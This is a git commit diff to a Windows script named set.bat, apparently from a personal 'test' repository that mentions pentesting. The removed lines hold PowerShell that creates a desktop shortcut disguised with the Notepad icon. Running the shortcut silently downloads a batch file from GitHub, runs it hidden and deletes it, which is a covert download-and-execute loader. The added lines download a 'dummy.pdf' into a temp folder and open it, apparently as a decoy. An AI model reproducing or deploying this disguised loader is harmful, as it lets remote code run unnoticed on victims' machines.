1f2a89aed87d56cec2f9917cad365127b2066684
bhekinko <bhekinkosiwm1726mw@protonmail.com>
2025-05-28 19:36:06 +0500

    Update set.bat

--- set.bat
+++ set.bat
@@ -1,13 +1,8 @@
-$WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\RunSet.lnk")
+@echo off
+set "target=%TEMP%\MyPenTest"
+set "pdfurl=https://raw.githubusercontent.com/bhekinko/test/main/dummy.pdf"
+set "pdflocal=%target%\dummy.pdf"
 
-$batUrl = "https://raw.githubusercontent.com/bhekinko/test/main/set.bat"
-$batPath = "$env:TEMP\set.bat"
-
-$cmd = "powershell -NoProfile -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri '$batUrl' -OutFile '$batPath'; Start-Process -FilePath '$batPath' -WindowStyle Hidden -Wait; Remove-Item '$batPath'`""
-
-$Shortcut.TargetPath = "cmd.exe"
-$Shortcut.Arguments = "/c $cmd"
-$Shortcut.WorkingDirectory = $env:TEMP  # ✅ dynamic Start in path
-$Shortcut.IconLocation = "notepad.exe, 0"
-$Shortcut.Save()
+mkdir "%target%" >nul 2>&1
+powershell -Command "Invoke-WebRequest -Uri '%pdfurl%' -OutFile '%pdflocal%'"
+start "" "%pdflocal%"
